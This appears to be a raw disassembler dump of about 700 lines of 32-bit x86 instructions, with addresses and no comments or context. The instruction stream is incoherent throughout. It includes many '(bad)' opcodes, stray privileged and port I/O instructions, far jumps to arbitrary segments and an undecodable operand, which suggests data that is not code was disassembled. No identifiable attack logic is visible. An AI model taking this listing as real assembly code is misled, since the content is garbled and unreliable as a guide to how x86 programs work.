  4178d2:	test   BYTE PTR [edi-0x51a490b9],0x71
  4178d9:	test   BYTE PTR es:0x62577ed1,ch
  4178e0:	mov    dh,0x5c
  4178e2:	or     ch,dl
  4178e4:	out    0xbb,eax
  4178e6:	mov    dh,0x87
  4178e8:	adc    al,ah
  4178ea:	xor    DWORD PTR [eax+eax*1],eax
  4178ed:	in     al,0x88
  4178ef:	ins    DWORD PTR es:[edi],dx
  4178f0:	mov    WORD PTR ds:0x6dd7b2ee,fs
  4178f6:	in     al,0x85
  4178f8:	dec    edi
  4178f9:	inc    eax
  4178fa:	or     BYTE PTR [ecx],bh
  4178fc:	mov    dl,0xbc
  4178fe:	shl    BYTE PTR [ebx-0x326cd7d0],0x1f
  417905:	jp     0x41796e
  417907:	fsubr  DWORD PTR [ebx]
  417909:	xchg   esi,eax
  41790a:	xchg   ebp,eax
  41790b:	xor    DWORD PTR [ebx*8+0x4bd5a366],ebx
  417912:	or     DWORD PTR [ebp-0x1d],0x70515c2
  417919:	mov    edx,0x8018cf0
  41791e:	sub    DWORD PTR [ebx-0x78bd8264],esi
  417924:	fidivr WORD PTR [esi-0x2e]
  417927:	and    DWORD PTR [ebx+0x77],0x898168b2
  41792e:	jbe    0x41795c
  417930:	lgs    esi,FWORD PTR [edi+0x7d]
  417934:	jp     0x4178e7
  417936:	push   edx
  417937:	or     dl,dl
  417939:	rcl    DWORD PTR [ecx+edi*4+0x70],1
  41793d:	mov    DWORD PTR [edx+0x6c020c56],ebx
  417943:	lods   al,BYTE PTR ds:[esi]
  417944:	pushf  
  417945:	pop    ds
  417946:	aaa    
  417947:	loope  0x41793d
  417949:	push   es
  41794a:	imul   edx,edi,0x2d32150e
  417950:	sbb    eax,0x93b1d302
  417955:	hlt    
  417956:	jbe    0x417901
  417958:	(bad)
  41795b:	sub    al,0x49
  41795d:	or     eax,0x9f78bdb9
  417962:	les    eax,FWORD PTR [ebp+0x44f0ce0e]
  417968:	movq   QWORD PTR [ebx],mm1
  41796b:	icebp  
  41796c:	imul   ebp,DWORD PTR [edx],0xb4f851b
  417972:	leave  
  417973:	xor    eax,0x502abf42
  417978:	mov    dl,0x66
  41797a:	push   0x38
  41797c:	inc    edi
  41797d:	mov    bh,0xe5
  41797f:	popa   
  417980:	pop    esi
  417981:	mov    esi,0xd0caca2f
  417986:	add    edx,DWORD PTR [edi*4+0x274927a2]
  41798d:	ror    DWORD PTR [edx-0x17ec45fa],1
  417993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417994:	shl    cl,0x1b
  417997:	test   BYTE PTR [eax+0x312ee6f2],dl
  41799d:	push   edx
  41799e:	and    edi,DWORD PTR [ecx-0x7a6d3205]
  4179a4:	dec    ebx
  4179a5:	mov    ebp,0x507aefd1
  4179aa:	sub    eax,0x1144b596
  4179af:	jle    0x417a05
  4179b1:	jg     0x4179f2
  4179b3:	sbb    bl,BYTE PTR ds:0x86b9125
  4179b9:	scas   eax,DWORD PTR es:[edi]
  4179ba:	imul   BYTE PTR [edx+0x36]
  4179bd:	mov    esi,0xbc15f78d
  4179c2:	xchg   al,ch
  4179c4:	sub    DWORD PTR [ecx+0x3],edx
  4179c7:	push   es
  4179c8:	sbb    eax,0x7851502a
  4179cd:	xchg   esi,eax
  4179ce:	faddp  st(2),st
  4179d0:	cli    
  4179d1:	dec    edi
  4179d2:	lods   eax,DWORD PTR ds:[esi]
  4179d3:	enter  0x978d,0x66
  4179d7:	mov    dl,0xb8
  4179d9:	fcmovu st,st(3)
  4179db:	push   edi
  4179dc:	adc    bh,BYTE PTR [edi+ebp*2]
  4179df:	shr    BYTE PTR [esi+0x7d],0xb2
  4179e3:	sti    
  4179e4:	mov    DWORD PTR [ecx-0x2],eax
  4179e7:	sbb    bl,ah
  4179e9:	and    bl,BYTE PTR ds:0x1dbb2840
  4179ef:	pop    eax
  4179f0:	jbe    0x4179eb
  4179f2:	adc    bl,dh
  4179f4:	loopne 0x4179f2
  4179f6:	cmp    BYTE PTR [edx-0x1bba7995],ah
  4179fc:	or     BYTE PTR [ebx],bl
  4179fe:	mov    ebx,0xda2f93d6
  417a03:	cmp    DWORD PTR [eax-0x68ce4101],edi
  417a09:	cmp    dl,BYTE PTR [ecx]
  417a0b:	fisttp DWORD PTR [ecx]
  417a0d:	cdq    
  417a0e:	je     0x4179a0
  417a10:	repnz lahf 
  417a12:	cmp    eax,DWORD PTR [eax+0x5d]
  417a15:	pop    edi
  417a16:	xchg   ebp,eax
  417a17:	xlat   BYTE PTR ds:[ebx]
  417a18:	pop    ds
  417a19:	dec    edi
  417a1a:	je     0x417a73
  417a1c:	mov    ds:0x93e5ba8,al
  417a21:	add    ch,ch
  417a23:	pop    edi
  417a24:	mov    bh,0x4d
  417a26:	or     ecx,DWORD PTR [eax-0x57]
  417a29:	push   ecx
  417a2a:	sbb    al,0xc5
  417a2c:	lds    ecx,FWORD PTR [ebp-0x72cf92f]
  417a32:	outs   dx,BYTE PTR ds:[esi]
  417a33:	mov    esp,edx
  417a35:	push   ds
  417a36:	lds    ebp,FWORD PTR [ebx-0x34]
  417a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a3a:	int3   
  417a3b:	das    
  417a3c:	rol    bl,1
  417a3e:	std    
  417a3f:	pop    edx
  417a40:	xor    eax,0xe99a52ce
  417a45:	shl    BYTE PTR ds:0xd6d457fd,0x82
  417a4c:	jge    0x417a53
  417a4e:	je     0x417a00
  417a50:	or     edi,esp
  417a52:	mov    DWORD PTR [esi],esi
  417a54:	dec    ebx
  417a55:	sub    ch,BYTE PTR [esp+edx*8-0xd76724c]
  417a5c:	hlt    
  417a5d:	jnp    0x417a23
  417a5f:	(bad)
  417a63:	fwait
  417a64:	(bad)
  417a68:	pop    eax
  417a69:	push   es
  417a6a:	pop    ebx
  417a6b:	inc    BYTE PTR [ecx-0x638da4a0]
  417a71:	jnp    0x417a3c
  417a73:	scas   eax,DWORD PTR es:[edi]
  417a74:	bound  eax,QWORD PTR [eax-0x6a3ec64]
  417a7a:	mov    dh,0x92
  417a7c:	nop
  417a7d:	sbb    esi,DWORD PTR [edx-0x26d18ffb]
  417a83:	adc    edi,DWORD PTR [edx+edi*2-0x3]
  417a87:	pop    edi
  417a88:	shl    cl,cl
  417a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a8b:	enter  0x67f9,0xe4
  417a8f:	jo     0x417a5e
  417a91:	sahf   
  417a92:	ror    esp,cl
  417a94:	xor    al,BYTE PTR [ecx-0x70]
  417a97:	push   ss
  417a98:	adc    edx,eax
  417a9a:	aam    0x9c
  417a9c:	add    esi,DWORD PTR [edi+ecx*8-0xd]
  417aa0:	mov    ch,0x56
  417aa2:	inc    eax
  417aa3:	push   ecx
  417aa4:	add    DWORD PTR [edi+0x31],esp
  417aa7:	shl    bl,0xc
  417aaa:	out    dx,eax
  417aab:	hlt    
  417aac:	ret    0xfa88
  417aaf:	in     al,dx
  417ab0:	inc    eax
  417ab1:	push   0xffffffd3
  417ab3:	inc    esp
  417ab4:	xor    dl,BYTE PTR [eax]
  417ab6:	pop    ebx
  417ab7:	xchg   ebp,eax
  417ab8:	dec    edx
  417ab9:	or     eax,0x9857a04a
  417abe:	sar    DWORD PTR [esi-0x77],0x8
  417ac2:	jle    0x417b01
  417ac4:	push   0x16e662a
  417ac9:	lock xor dh,al
  417acc:	icebp  
  417acd:	push   esi
  417ace:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  417ad0:	cmp    al,BYTE PTR [ebp+esi*8+0x1527038f]
  417ad7:	sbb    al,0x4b
  417ad9:	sbb    edx,DWORD PTR [eax]
  417adb:	inc    ecx
  417adc:	mov    ebp,0x927ae778
  417ae1:	(bad)  
  417ae2:	or     al,0x72
  417ae4:	jle    0x417adf
  417ae6:	push   es
  417ae7:	jge    0x417b4a
  417ae9:	mov    ah,0xd6
  417aeb:	ret    
  417aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aed:	outs   dx,BYTE PTR ds:[esi]
  417aee:	nop
  417aef:	push   ds
  417af0:	xchg   ebp,eax
  417af1:	rcr    DWORD PTR [edx-0x2b],cl
  417af4:	inc    edx
  417af5:	or     ecx,esp
  417af7:	cmp    esi,ecx
  417af9:	jmp    0xca5e:0x238c03b0
  417b00:	or     al,0x36
  417b02:	in     al,0xa7
  417b04:	sub    BYTE PTR [edi+0x4c839c6d],bh
  417b0a:	add    al,0xc3
  417b0c:	pop    esi
  417b0d:	or     eax,0x43ae0c35
  417b12:	ja     0x417b09
  417b14:	ret    
  417b15:	hlt    
  417b16:	into   
  417b17:	pop    ebp
  417b18:	mov    BYTE PTR [eax],dl
  417b1a:	cwde   
  417b1b:	jno    0x417ab9
  417b1d:	stc    
  417b1e:	in     eax,0x97
  417b20:	les    edi,FWORD PTR [esi]
  417b22:	cmp    BYTE PTR [eax+0xe],bh
  417b25:	rcl    ch,0x9d
  417b28:	or     BYTE PTR [esi-0x70],bl
  417b2b:	mov    dh,0xb5
  417b2d:	das    
  417b2e:	mov    eax,0x7ee81d47
  417b33:	push   0x8552930c
  417b38:	and    dh,BYTE PTR [eax]
  417b3a:	and    BYTE PTR [ebp-0x50],dh
  417b3d:	mov    bh,0x8b
  417b3f:	ja     0x417ac2
  417b41:	jmp    0x417b41
  417b43:	push   ebx
  417b44:	jmp    0x20ec:0x28305f0e
  417b4b:	outs   dx,BYTE PTR ds:[esi]
  417b4c:	xor    eax,DWORD PTR ds:0xf3dfe0c0
  417b52:	pop    esp
  417b53:	sub    DWORD PTR [esi-0x1f530bdf],ecx
  417b59:	inc    eax
  417b5a:	lock shl cl,1
  417b5d:	sub    al,0xcd
  417b5f:	in     al,dx
  417b60:	(bad)  
  417b62:	or     DWORD PTR [ecx+0x5b],0xffffffa6
  417b66:	or     eax,0x26a5d07e
  417b6b:	unpcklps xmm4,XMMWORD PTR [ecx+0x70]
  417b6f:	xchg   esp,eax
  417b70:	fisub  DWORD PTR [ecx-0x2b]
  417b73:	js     0x417bea
  417b75:	push   cs
  417b76:	ins    DWORD PTR es:[edi],dx
  417b77:	es mov ebx,0x2eac2f87
  417b7d:	in     eax,0x3a
  417b7f:	mov    DWORD PTR [edi],esi
  417b81:	cmp    BYTE PTR [eax-0x7a],ah
  417b84:	inc    edi
  417b85:	jl     0x417bbc
  417b87:	xchg   DWORD PTR [ebx],ecx
  417b89:	push   ecx
  417b8a:	push   gs
  417b8c:	js     0x417b92
  417b8e:	into   
  417b8f:	mov    dh,0x31
  417b91:	or     edx,DWORD PTR [ecx+0x68ca0ac8]
  417b97:	dec    ecx
  417b98:	xchg   ebp,eax
  417b99:	shl    eax,cl
  417b9b:	repnz or ebp,esi
  417b9e:	pop    esi
  417b9f:	inc    ebx
  417ba0:	mov    ah,0x21
  417ba2:	push   cs
  417ba3:	(bad)  
  417ba4:	js     0x417be2
  417ba6:	and    al,0x86
  417ba8:	or     ecx,DWORD PTR [edx-0x19]
  417bab:	xor    eax,0xf9e1412e
  417bb0:	popf   
  417bb1:	and    eax,0x53
  417bb4:	xor    al,0xf9
  417bb6:	jne    0x417b5f
  417bb8:	jns    0x417b81
  417bba:	jb     0x417b7c
  417bbc:	mov    esp,0x7fc52f4c
  417bc1:	adc    al,0x53
  417bc3:	stc    
  417bc4:	hlt    
  417bc5:	xchg   ecx,eax
  417bc6:	adc    al,BYTE PTR [ecx+0x1ffba5c2]
  417bcc:	or     al,0x34
  417bce:	test   BYTE PTR [eax],bl
  417bd0:	jae    0x417c06
  417bd2:	push   ebp
  417bd3:	inc    eax
  417bd4:	dec    esi
  417bd5:	sbb    BYTE PTR [ecx-0x6352bbd3],cl
  417bdb:	repz sub bh,BYTE PTR [ebx-0x1ef415d3]
  417be2:	clc    
  417be3:	sub    DWORD PTR [ebx],edi
  417be5:	sub    eax,0xfe9e8d0
  417bea:	cld    
  417beb:	out    dx,eax
  417bec:	xchg   ebp,eax
  417bed:	jmp    0x25c3:0x6e2a1e87
  417bf4:	sub    al,0x38
  417bf6:	cmp    eax,0x7af62f9e
  417bfb:	aad    0xb2
  417bfd:	jp     0x417bf3
  417bff:	sahf   
  417c00:	imul   edi,DWORD PTR [esi+0x65],0xffffff92
  417c04:	sub    ch,cl
  417c06:	dec    eax
  417c07:	xor    BYTE PTR [eax+0x1f],dh
  417c0a:	mov    esp,0xc7543243
  417c0f:	sub    eax,0x68e9912d
  417c14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c15:	aaa    
  417c16:	push   ss
  417c17:	cdq    
  417c18:	shr    BYTE PTR [esi-0x1e97c3c6],1
  417c1e:	cmp    BYTE PTR [ebx],bh
  417c20:	jmp    0xbbec05af
  417c25:	call   0xb7464b9f
  417c2a:	or     ch,BYTE PTR [ebx]
  417c2c:	sub    eax,0x654bd766
  417c31:	inc    esi
  417c32:	jg     0x417bb7
  417c34:	in     eax,0x17
  417c36:	inc    esp
  417c37:	inc    esi
  417c38:	cmp    dh,dh
  417c3a:	push   0xffffff8a
  417c3c:	pop    eax
  417c3d:	shr    BYTE PTR [ecx],1
  417c3f:	hlt    
  417c40:	pop    edx
  417c41:	enter  0xf83b,0x3e
  417c45:	into   
  417c46:	aam    0xca
  417c48:	rol    bh,1
  417c4a:	ffreep st(5)
  417c4c:	rcr    BYTE PTR [edi],cl
  417c4e:	inc    esi
  417c4f:	cmp    al,0xf1
  417c51:	jae    0x417c1e
  417c53:	mov    al,ds:0xe8df5156
  417c58:	xor    BYTE PTR [esi],bl
  417c5a:	mov    dl,BYTE PTR [eax+0x50b14d80]
  417c60:	loopne 0x417c40
  417c62:	xchg   edx,eax
  417c63:	(bad)  
  417c64:	push   ecx
  417c65:	ror    BYTE PTR [esi-0x44532e12],0x25
  417c6c:	xor    ecx,esp
  417c6e:	stos   DWORD PTR es:[edi],eax
  417c6f:	jmp    0x34d2f5b6
  417c74:	(bad)  
  417c76:	mov    ds:0x8d1e014b,al
  417c7b:	mov    gs,WORD PTR [ebp+0x5d]
  417c7e:	ds jl  0x417cd3
  417c81:	test   BYTE PTR [edi+0x3f],0xfc
  417c85:	idiv   BYTE PTR [ecx-0x6f]
  417c88:	push   0xffffffa7
  417c8a:	loope  0x417cd5
  417c8c:	inc    ecx
  417c8d:	mov    dl,0x68
  417c8f:	jmp    0x1336:0x768d22b0
  417c96:	paddw  mm4,QWORD PTR [eax+0x79]
  417c9a:	inc    ebp
  417c9b:	mov    ebx,0x97a61b97
  417ca0:	lock xchg esp,eax
  417ca2:	jbe    0x417c64
  417ca4:	ins    BYTE PTR es:[edi],dx
  417ca5:	push   esp
  417ca6:	fiadd  DWORD PTR [esi-0x758672ef]
  417cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cad:	loop   0x417c82
  417caf:	jmp    0x417d10
  417cb1:	pop    edi
  417cb2:	hlt    
  417cb3:	mov    cl,0x8d
  417cb5:	rol    ebp,1
  417cb7:	xchg   esi,eax
  417cb8:	sbb    al,0x11
  417cba:	or     ch,dh
  417cbc:	cmp    bh,BYTE PTR [eax-0x3a]
  417cbf:	pop    eax
  417cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cc1:	adc    eax,0x6bb68fb0
  417cc6:	stc    
  417cc7:	test   BYTE PTR [esi+0x34],bl
  417cca:	pop    ebx
  417ccb:	inc    edi
  417ccc:	push   esi
  417ccd:	mov    bh,0x1d
  417ccf:	pop    ss
  417cd0:	mov    bh,0xd4
  417cd2:	dec    ebp
  417cd3:	call   0xec6d:0xe7f894de
  417cda:	adc    al,0xa6
  417cdc:	scas   eax,DWORD PTR es:[edi]
  417cdd:	rol    edi,1
  417cdf:	push   0x8fec7700
  417ce4:	dec    edx
  417ce5:	repz out dx,eax
  417ce7:	outs   dx,BYTE PTR ds:[esi]
  417ce8:	jmp    0xc3f129dd
  417ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cee:	ret    
  417cef:	jno    0x417cda
  417cf1:	shl    DWORD PTR [eax-0x577cca9e],cl
  417cf7:	jns    0x417c89
  417cf9:	add    al,0x6b
  417cfb:	inc    ecx
  417cfc:	inc    ebp
  417cfd:	(bad)  
  417cfe:	fcmovbe st,st(4)
  417d00:	test   cl,bl
  417d02:	sysret 
  417d04:	dec    ebx
  417d05:	addr16 xor ecx,esp
  417d08:	(bad)  
  417d09:	jb     0x417d55
  417d0b:	aam    0x5
  417d0d:	daa    
  417d0e:	call   0xc4c2:0x139ceb63
  417d15:	cdq    
  417d16:	psrlw  mm3,mm4
  417d19:	lods   al,BYTE PTR ds:[esi]
  417d1a:	adc    dh,BYTE PTR [ecx-0x7]
  417d1d:	or     DWORD PTR [ecx+esi*2+0x604bd800],0x6
  417d25:	adc    esi,DWORD PTR [esi-0x2f]
  417d28:	inc    BYTE PTR ds:0xba164d7f
  417d2e:	shl    BYTE PTR [ebp-0xc],0x6a
  417d32:	add    DWORD PTR [eax],esp
  417d34:	pop    ds
  417d35:	or     eax,0xc770e9a6
  417d3a:	fwait
  417d3b:	scas   al,BYTE PTR es:[edi]
  417d3c:	test   esp,0x115616fc
  417d42:	mov    ecx,0x1e5e6b89
  417d47:	push   ecx
  417d48:	and    edx,DWORD PTR [edx-0x4e]
  417d4b:	imul   ecx,DWORD PTR [eax],0xa51c7b8d
  417d51:	sbb    BYTE PTR [ebp+0x2685232],0xb8
  417d58:	not    BYTE PTR [edi+0x7890798]
  417d5e:	fs addr16 jne 0x417d49
  417d62:	push   0xfffffff6
  417d64:	xchg   ebp,eax
  417d65:	aaa    
  417d66:	(bad)  
  417d68:	mov    eax,ecx
  417d6a:	pop    edx
  417d6b:	cmp    BYTE PTR [ecx+eax*4+0x74fd432b],ch
  417d72:	int3   
  417d73:	(bad)  
  417d74:	retf   
  417d75:	leave  
  417d76:	and    al,0x13
  417d78:	sbb    BYTE PTR [ebx-0x6a],ah
  417d7b:	jno    0x417d10
  417d7d:	add    BYTE PTR [edx+0x244e9b3e],ah
  417d83:	and    DWORD PTR [eax],edi
  417d85:	and    al,0x75
  417d87:	pop    ebp
  417d88:	dec    edx
  417d89:	ins    DWORD PTR es:[edi],dx
  417d8a:	push   0x766b2615
  417d8f:	stos   BYTE PTR es:[edi],al
  417d90:	adc    DWORD PTR [ebx+eax*2],esi
  417d93:	lahf   
  417d94:	sti    
  417d95:	inc    edx
  417d96:	xor    BYTE PTR [ebx-0x6b],cl
  417d99:	sub    edx,DWORD PTR [edi-0x791d9017]
  417d9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417da0:	adc    eax,0xa8fff884
  417da5:	push   ebp
  417da6:	or     bh,BYTE PTR [ecx-0x239eb414]
  417dac:	aaa    
  417dad:	loop   0x417dce
  417daf:	mov    ds:0xd332fde2,al
  417db4:	jae    0x417df8
  417db6:	xor    eax,0x5fe97bf6
  417dbb:	push   ebx
  417dbc:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dbe:	cmp    edx,DWORD PTR [eax+0x603bb3a0]
  417dc4:	jne    0x417e09
  417dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dc7:	xor    eax,0x8d7cb94b
  417dcc:	mov    dh,0x2d
  417dce:	add    eax,0x90fff587
  417dd3:	mov    edx,0xd7ac12ad
  417dd8:	cld    
  417dd9:	adc    BYTE PTR [edx],cl
  417ddb:	dec    esp
  417ddc:	add    bl,bh
  417dde:	or     eax,0x8a23c6c6
  417de3:	mov    WORD PTR [eax-0xeaee2b8],es
  417de9:	mov    eax,ds:0x8382b20
  417dee:	iret   
  417def:	cmp    esi,eax
  417df1:	sti    
  417df2:	inc    edx
  417df3:	scas   eax,DWORD PTR es:[edi]
  417df4:	dec    edx
  417df5:	int    0xa1
  417df7:	push   ds
  417df8:	fstp   TBYTE PTR [ecx-0x71]
  417dfb:	dec    ebp
  417dfc:	xchg   edi,eax
  417dfd:	out    dx,eax
  417dfe:	jl     0x417e46
  417e00:	pop    ds
  417e01:	mov    cl,0x83
  417e03:	das    
  417e04:	in     eax,dx
  417e05:	mov    al,ds:0x9ccbf0e0
  417e0a:	xchg   ebp,eax
  417e0b:	call   0x9d8cd4f6
  417e10:	in     eax,0x63
  417e12:	push   cs
  417e13:	cmp    eax,ebx
  417e15:	cmp    eax,0xe03a4a72
  417e1a:	imul   eax,DWORD PTR [ebx+0x40],0xffffffe3
  417e1e:	test   al,0x0
  417e20:	jge    0x417daf
  417e22:	mov    eax,0x7285d23e
  417e27:	pop    es
  417e28:	xor    dl,BYTE PTR [eax-0x74daa297]
  417e2e:	not    BYTE PTR [ecx-0x7488e6fc]
  417e34:	rol    BYTE PTR [eax+0x75],cl
  417e37:	loop   0x417e1f
  417e39:	dec    esi
  417e3a:	sbb    al,0xb7
  417e3c:	xlat   BYTE PTR ds:[ebx]
  417e3d:	(bad)  
  417e3e:	cmp    BYTE PTR [edx],cl
  417e40:	sbb    esi,DWORD PTR [ecx+0x14]
  417e43:	and    al,0x31
  417e45:	loop   0x417dea
  417e47:	enter  0x98c6,0xb0
  417e4b:	repz adc edi,DWORD PTR [ebx+0x1e1f0544]
  417e52:	outs   dx,BYTE PTR ds:[esi]
  417e53:	out    0xef,eax
  417e55:	ret    0x62ee
  417e58:	mov    edx,0xfdb46cf9
  417e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e5e:	dec    edx
  417e5f:	push   ebp
  417e60:	mov    ch,0x9c
  417e62:	jl     0x417e69
  417e64:	xor    dh,BYTE PTR [ebx-0x36]
  417e67:	xchg   edi,eax
  417e68:	sub    ecx,edi
  417e6a:	test   bl,cl
  417e6c:	sub    cl,BYTE PTR [edx-0x72fa919c]
  417e72:	(bad)  
  417e73:	push   ss
  417e74:	inc    esi
  417e75:	adc    DWORD PTR [edx-0x5a57bac1],eax
  417e7b:	add    ah,cl
  417e7d:	cld    
  417e7e:	es or  eax,ebx
  417e81:	xor    BYTE PTR [eax-0x45fcfaca],dl
  417e87:	jg     0x417ea9
  417e89:	test   BYTE PTR [ebp+0x4c],ch
  417e8c:	mov    BYTE PTR [ebp-0x14],cl
  417e8f:	call   0x8e1d6375
  417e94:	leave  
  417e95:	push   esp
  417e96:	mov    dh,0xdf
  417e98:	fs pop edx
  417e9a:	outs   dx,DWORD PTR ds:[esi]
  417e9b:	inc    esi
  417e9c:	test   BYTE PTR [esi-0xe16bd0b],bl
  417ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ea3:	lock pop ebp
  417ea5:	inc    ecx
  417ea6:	stc    
  417ea7:	xor    dl,dl
  417ea9:	cs pop ss
  417eab:	sub    ah,BYTE PTR [esi]
  417ead:	rcl    DWORD PTR [ecx],0x87
  417eb0:	shl    ah,0xb8
  417eb3:	js     0x417ec5
  417eb5:	inc    ebx
  417eb6:	ja     0x417f2a
  417eb8:	aad    0xce
  417eba:	hlt    
  417ebb:	das    
  417ebc:	inc    ebp
  417ebd:	xor    al,0xe9
  417ebf:	inc    esp
  417ec0:	cmp    DWORD PTR [ebp+ebp*2+0x6f28607e],0xc6435e2
  417ecb:	push   cs
  417ecc:	jnp    0x417e57
  417ece:	push   edx
  417ecf:	stos   DWORD PTR es:[edi],eax
  417ed0:	sub    cl,bh
  417ed2:	sahf   
  417ed3:	nop    DWORD PTR [edx]
  417ed6:	pop    esp
  417ed7:	inc    eax
  417ed8:	stos   DWORD PTR es:[edi],eax
  417ed9:	xor    BYTE PTR [edi+edx*2+0x5b],ch
  417edd:	and    eax,0x19bfe648
  417ee2:	lods   eax,DWORD PTR ds:[esi]
  417ee3:	add    eax,0x44c51bcf
  417ee8:	repnz mov esi,0x3809129a
  417eee:	cmp    DWORD PTR [esi+0x54e47d43],ebx
  417ef4:	imul   ebp,esi,0x7fe9ec37
  417efa:	cmp    ecx,ebx
  417efc:	imul   eax,DWORD PTR [eax+0x56644984],0x61
  417f03:	(bad)  
  417f04:	fwait
  417f05:	jecxz  0x417f33
  417f07:	loope  0x417ee1
  417f09:	aaa    
  417f0a:	dec    ebp
  417f0b:	js     0x417ed3
  417f0d:	ja     0x417ea6
  417f0f:	jle    0x417f7b
  417f11:	stos   BYTE PTR es:[edi],al
  417f12:	lahf   
  417f13:	dec    eax
  417f14:	call   0x94e5:0x3ff6a16f
  417f1b:	mov    eax,ds:0xe347385c
  417f20:	sub    ah,ch
  417f22:	cmp    edi,DWORD PTR [esi-0x72]
  417f25:	jo     0x417edd
  417f27:	adc    BYTE PTR [esi+ecx*1-0x53],0x24
  417f2c:	pop    ds
  417f2d:	aas    
  417f2e:	xor    bh,ah
  417f30:	das    
  417f31:	mov    dl,0xca
  417f33:	inc    ebx
  417f34:	les    esi,FWORD PTR [edi]
  417f36:	ja     0x417edb
  417f38:	mov    eax,ds:0xa61fb8ff
  417f3d:	jecxz  0x417f14
  417f3f:	mov    al,ds:0xb54d7f2a
  417f44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f45:	jae    0x417ecf
  417f47:	cwde   
  417f48:	pop    ss
  417f49:	dec    ebp
  417f4a:	or     DWORD PTR [ecx-0x4aefccdb],edi
  417f50:	leave  
  417f51:	xchg   ebx,eax
  417f52:	sahf   
  417f53:	cmp    edx,DWORD PTR [esi-0x5de14b43]
  417f59:	cli    
  417f5a:	pop    ebp
  417f5b:	out    dx,eax
  417f5c:	and    eax,DWORD PTR [eax+0x4a]
  417f5f:	xor    al,0x8d
  417f61:	sbb    edi,ebp
  417f63:	and    al,0x21
  417f65:	popf   
  417f66:	and    DWORD PTR [ebp+0x5df477d7],esp
  417f6c:	jb     0x417fc0
  417f6e:	jae    0x417fdc
  417f70:	sub    BYTE PTR [ecx-0x71446db3],dl
  417f76:	leave  
  417f77:	frstor [ecx+eiz*1+0x5c]
  417f7b:	inc    esp
  417f7c:	mov    ch,0xed
  417f7e:	sub    esi,esi
  417f80:	in     eax,0x17
  417f82:	daa    
  417f83:	or     DWORD PTR [eax-0x5b],eax
  417f86:	rol    DWORD PTR [ebx+edx*8-0x2af5f934],cl
  417f8d:	je     0x417f66
  417f8f:	jne    0x417fe8
  417f91:	retf   
  417f92:	sbb    BYTE PTR ds:0xb6f23b22,0x77
  417f99:	inc    eax
  417f9a:	mov    ecx,0xcd932b5c
  417f9f:	sbb    ah,BYTE PTR [ebx+eax*4]
  417fa2:	std    
  417fa3:	add    ah,BYTE PTR [ebp-0x27]
  417fa6:	pop    edi
  417fa7:	lods   eax,DWORD PTR ds:[esi]
  417fa8:	(bad)  
  417fa9:	sbb    bh,BYTE PTR [edi+0x4953dc13]
  417faf:	xchg   esp,eax
  417fb0:	pushf  
  417fb1:	(bad)  
  417fb3:	push   ebx
  417fb4:	jmp    0x418009
  417fb6:	mov    ch,0xf4
  417fb8:	push   edi
  417fb9:	fst    DWORD PTR [eax+0x1bbbd3b6]
  417fbf:	ins    DWORD PTR es:[edi],dx
  417fc0:	or     BYTE PTR [edx-0x38],dh
  417fc3:	dec    esp
  417fc4:	jno    0x417f7a
  417fc6:	inc    ebx
  417fc7:	data16 outs dx,BYTE PTR ds:[esi]
  417fc9:	aaa    
  417fca:	jae    0x417f91
  417fcc:	jnp    0x417fe4
  417fce:	adc    BYTE PTR [ebp+0x7eadb8c4],dl
  417fd4:	mov    al,ds:0x4955b9e7
  417fd9:	push   ss
  417fda:	je     0x417fe0
  417fdc:	inc    edi
  417fdd:	inc    ecx
  417fde:	mov    esp,0xe2fca909
  417fe3:	fidiv  DWORD PTR [eax]
  417fe5:	push   ebx
  417fe6:	add    DWORD PTR [ecx-0x7cc8e743],esp
  417fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fed:	out    dx,eax
  417fee:	jge    0x418041
  417ff0:	iret   
  417ff1:	loop   0x418048
  417ff3:	jle    0x417fc2
  417ff5:	jns    0x417fc3
  417ff7:	cmp    DWORD PTR [esp+ebx*8+0x4b],esi
  417ffb:	mov    BYTE PTR [ecx-0x3164472],dh
  418001:	and    al,0xae
  418003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418004:	push   edi
  418005:	call   ecx
  418007:	ja     0x417fea
  418009:	xchg   edi,eax
  41800a:	cmp    ch,dh
  41800c:	adc    ah,BYTE PTR [ecx-0x29]
  41800f:	cdq    
  418010:	pusha  
  418011:	out    dx,al
  418012:	add    DWORD PTR [esi-0x5e],ebx
  418015:	arpl   WORD PTR [ebx+0x26328b7f],bp
  41801b:	dec    ebx
  41801c:	push   esi
  41801d:	dec    edi
  41801e:	add    esp,DWORD PTR [ebp-0x63]
  418021:	jp     0x418007
  418023:	gs mov bh,0x9a
  418026:	cs sbb cl,BYTE PTR ds:[eax+0x44]
  41802b:	enter  0x9198,0x65
  41802f:	das    
  418030:	mov    es,ecx
  418032:	in     eax,0x50
  418034:	scas   al,BYTE PTR es:[edi]
  418035:	fist   WORD PTR [eax]
  418037:	xchg   esp,eax
  418038:	outs   dx,BYTE PTR ds:[esi]
  418039:	mov    al,ds:0xe1d02817
  41803e:	fidiv  DWORD PTR [esi]
  418040:	bound  eax,QWORD PTR [ebp-0x5477f23a]
  418046:	mov    esp,0xec09f603
  41804b:	lock sub ebp,DWORD PTR [eax-0x69]
  41804f:	pusha  
  418050:	fs mov eax,0x1b7e075c
  418056:	fcomip st,st(3)
  418058:	gs mov edx,0x72f30573
  41805e:	mov    ?,esp
  418060:	loop   0x4180c5
  418062:	push   ecx
  418063:	pop    eax
  418064:	cs call 0x5ad7:0xcab2f631
  41806c:	xor    ch,ch
  41806e:	hlt    
  41806f:	lods   al,BYTE PTR ds:[esi]
  418070:	push   es
  418071:	out    dx,eax
  418072:	mov    ebx,0xe890fe86
  418077:	or     ah,cl
